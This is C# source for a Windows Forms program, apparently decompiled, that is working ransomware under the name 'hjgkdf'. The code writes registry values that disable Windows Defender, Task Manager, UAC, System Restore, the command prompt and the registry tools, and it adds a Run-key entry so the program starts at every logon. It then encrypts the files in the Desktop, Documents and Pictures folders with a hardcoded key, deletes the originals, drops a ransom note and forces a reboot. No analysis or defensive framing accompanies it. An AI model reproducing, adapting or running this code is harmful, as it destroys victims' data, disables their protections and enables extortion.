using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace hjgkdf;

public class Form1 : Form
{
	private const bool DELETE_ALL_ORIGINALS = true;

	private const bool ENCRYPT_DESKTOP = true;

	private const bool ENCRYPT_DOCUMENTS = true;

	private const bool ENCRYPT_PICTURES = true;

	private const string ENCRYPTED_FILE_EXTENSION = ".hjgkdf";

	private const string ENCRYPT_PASSWORD = "45878575346885467854879865976947896578678897896787954765489789768768905768907809678609476809768097689076878609768";

	private static string ENCRYPTION_LOG = "";

	private string RANSOM_LETTER = "your files have been encrypted.";

	private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static int encryptedFileCount = 0;

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_03dd: Unknown result type (might be due to invalid IL or missing references)
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
		RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey2.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
		RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey3.SetValue("hjgkdf", Application.get_ExecutablePath().ToString());
		RegistryKey registryKey4 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
		registryKey4.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
		RegistryKey registryKey5 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
		registryKey5.SetValue("DisableRoutinelyTakingAction", 1, RegistryValueKind.DWord);
		RegistryKey registryKey6 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey6.SetValue("WindowsDefenderMAJ", 1, RegistryValueKind.DWord);
		RegistryKey registryKey7 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey7.SetValue("WindowsDefenderMAJ", 1, RegistryValueKind.DWord);
		RegistryKey registryKey8 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
		registryKey8.SetValue("Enabled", 0, RegistryValueKind.DWord);
		RegistryKey registryKey9 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
		registryKey9.SetValue("Enabled", 0, RegistryValueKind.DWord);
		RegistryKey registryKey10 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
		registryKey10.SetValue("DisableSR", 1, RegistryValueKind.DWord);
		RegistryKey registryKey11 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
		registryKey11.SetValue("DisableSR", 1, RegistryValueKind.DWord);
		RegistryKey registryKey12 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
		registryKey12.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
		RegistryKey registryKey13 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
		registryKey13.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
		RegistryKey registryKey14 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
		registryKey14.SetValue("USBTOR", 4, RegistryValueKind.DWord);
		RegistryKey registryKey15 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
		registryKey15.SetValue("USBTOR", 4, RegistryValueKind.DWord);
		RegistryKey registryKey16 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows");
		registryKey16.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
		RegistryKey registryKey17 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
		registryKey17.SetValue("Restrict_Run", 1, RegistryValueKind.DWord);
		RegistryKey registryKey18 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
		registryKey18.SetValue("Restrict_Run", 1, RegistryValueKind.DWord);
		RegistryKey registryKey19 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
		registryKey19.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
		RegistryKey registryKey20 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
		registryKey20.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
		RegistryKey registryKey21 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
		registryKey21.SetValue("SecurityHealthService", 4, RegistryValueKind.DWord);
		RegistryKey registryKey22 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey22.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
		RegistryKey registryKey23 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
		registryKey23.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
		RegistryKey registryKey24 = Registry.LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\SafeBoot\\Minimal");
		registryKey24.SetValue("MinimalX", 1, RegistryValueKind.DWord);
		RegistryKey registryKey25 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey25.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
		initializeForm();
		try
		{
			encryptFolderContents(DESKTOP_FOLDER);
		}
		catch
		{
		}
		encryptFolderContents(PICTURES_FOLDER);
		encryptFolderContents(DOCUMENTS_FOLDER);
		if (encryptedFileCount > 0)
		{
			formatFormPostEncryption();
			dropRansomLetter();
			Process.Start("shutdown", "/r /t 0");
		}
		else
		{
			Form2 form = new Form2();
			((Form)form).ShowDialog();
		}
	}

	private void dropRansomLetter()
	{
		StreamWriter streamWriter = new StreamWriter(DESKTOP_FOLDER + "your files have been encrypted.hjgkdf.txt");
		streamWriter.WriteLine(RANSOM_LETTER);
		streamWriter.WriteLine(ENCRYPTION_LOG);
		streamWriter.Close();
	}

	private void formatFormPostEncryption()
	{
		((Form)this).set_Opacity(100.0);
	}

	private void initializeForm()
	{
		((Form)this).set_Opacity(0.0);
	}

	private static void encryptFolderContents(string sDir)
	{
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (!text.Contains(".hjgkdf"))
				{
					Console.Out.WriteLine("Encrypting: " + text);
					FileEncrypt(text, "45878575346885467854879865976947896578678897896787954765489789768768905768907809678609476809768097689076878609768");
				}
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				encryptFolderContents(sDir2);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void FileEncrypt(string inputFile, string password)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(inputFile + ".hjgkdf", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			ENCRYPTION_LOG = ENCRYPTION_LOG + inputFile + "\n";
			encryptedFileCount++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
	}

	private static void FileDecrypt(string inputFile, string outputFile, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine("CryptographicException error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error: " + ex2.Message);
		}
		try
		{
			cryptoStream.Close();
		}
		catch (Exception ex3)
		{
			Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
